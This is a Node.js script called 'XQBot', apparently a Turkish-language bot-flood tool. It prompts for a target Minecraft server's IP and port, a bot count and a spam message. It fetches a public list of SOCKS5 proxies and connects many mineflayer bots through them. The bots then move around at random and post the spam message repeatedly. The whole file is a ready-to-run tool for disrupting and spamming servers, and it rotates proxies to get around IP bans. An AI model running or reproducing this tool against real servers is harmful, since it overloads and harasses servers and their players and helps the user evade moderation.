const mineflayer = require('mineflayer');
const { SocksProxyAgent } = require('socks-proxy-agent');
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const ask = (q) => new Promise((res) => rl.question(q, res));

function sleep(ms) {
    return new Promise((res) => setTimeout(res, ms));
}

async function typeWriter(text, delay = 25) {
    for (let i = 0; i < text.length; i++) {
        process.stdout.write(text[i]);
        await sleep(delay);
    }
    process.stdout.write('\n');
}

async function playMissileAnimation() {
    console.clear();
    const frames = [
        `
        
           🚀
           
        `,
        `
           
           🚀
           
        `,
        `
               
               🚀
               
        `,
        `
                   
                   💥
                   
        `,
        `
                       
                       💥 BOOM!
                       
        `
    ];

    for (let i = 0; i < frames.length; i++) {
        console.clear();
        console.log("\x1b[31m" + frames[i] + "\x1b[0m");
        console.log("\x1b[33m[!] XQBot SİSTEMİ ATEŞLENDİ... HEDEF VURULUYOR...\x1b[0m");
        await sleep(600);
    }
    await sleep(1000);
    console.clear();
}

async function start() {
    await playMissileAnimation();

    console.log(`\x1b[35m  __   __  ____   ____        _     \x1b[0m`);
    console.log(`\x1b[35m  \\ \\ / / / __ \\ |  _ \\      | |    \x1b[0m`);
    console.log(`\x1b[35m   \\ V / | |  | || |_) | ___ | |_   \x1b[0m`);
    console.log(`\x1b[35m    > <  | |  | ||  _ < / _ \\| __|  \x1b[0m`);
    console.log(`\x1b[35m   / . \\ | |__| || |_) | (_) | |_   \x1b[0m`);
    console.log(`\x1b[35m  /_/ \\_\\ \\___\\_\\|____/ \\___/ \\__|  \x1b[0m`);
    console.log(`\x1b[36m====================================================\x1b[0m`);
    console.log(`\x1b[33m         XQBot - Ultimate Load Protocol            \x1b[0m`);
    console.log(`\x1b[36m====================================================\x1b[0m\n`);

    const host = await ask('\x1b[32m[?]\x1b[0m Hedef IP: ') || '127.0.0.1';
    const port = parseInt(await ask('\x1b[32m[?]\x1b[0m Hedef Port: ')) || 25565;
    const version = await ask('\x1b[32m[?]\x1b[0m Minecraft Sürümü (örn: 1.21.1): ') || '1.21.1';
    const count = parseInt(await ask('\x1b[32m[?]\x1b[0m Bot Sayısı: ')) || 70;
    const message = await ask('\x1b[32m[?]\x1b[0m Spam Mesajı: ') || 'XQBot Target Destroyed!';

    rl.close();

    await typeWriter('\x1b[36m[*] Proxy kaynakları taranıyor ve aktif tüneller açılıyor...\x1b[0m', 20);

    let proxies = [];
    try {
        const res = await axios.get('https://raw.githubusercontent.com/thespeedX/PROXY-List/master/socks5.txt', { timeout: 5000 });
        proxies = res.data.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    } catch (e) {
        if (fs.existsSync('proxies.txt')) {
            proxies = fs.readFileSync('proxies.txt', 'utf8').split('\n').map(l => l.trim()).filter(l => l.includes(':'));
        }
    }

    if (proxies.length === 0) {
        console.log('\x1b[31m[!] Proxy bulunamadı, lokal tünel kullanılacak.\x1b[0m');
        proxies = ['127.0.0.1:25565'];
    }

    await typeWriter(`\x1b[32m[+] Toplam ${proxies.length} proxy yüklendi. Gönderim başlatılıyor...\x1b[0m`, 20);

    let active = 0;

    function spawnBot(id, proxy) {
        const username = `XQBot_${id}_${Math.floor(Math.random() * 900 + 100)}`;
        const [ph, pp] = proxy.split(':');
        const agent = new SocksProxyAgent(`socks5://${ph}:${pp}`);

        const bot = mineflayer.createBot({
            host: host,
            port: port,
            username: username,
            version: version,
            agent: agent
        });

        bot.on('spawn', () => {
            active++;
            console.log(`\x1b[32m[GÖNDERİLDİ] (${active}/${count}) ${username} operasyon bölgesine sızdı! [IP: ${ph}]\x1b[0m`);

            setInterval(() => {
                if (!bot.entity) return;
                bot.look(Math.random() * Math.PI * 2, 0, true, () => {
                    bot.setControlState('forward', true);
                    setTimeout(() => bot.setControlState('forward', false), 500);
                });
            }, 7000 + Math.random() * 3000);

            setInterval(() => {
                bot.chat(message);
            }, 6000 + Math.random() * 2000);
        });

        bot.on('kicked', () => {});
        bot.on('error', () => {});
    }

    for (let i = 1; i <= count; i++) {
        const proxy = proxies[(i - 1) % proxies.length];
        setTimeout(() => {
            spawnBot(i, proxy);
        }, i * 1200);
    }
}

start();
                
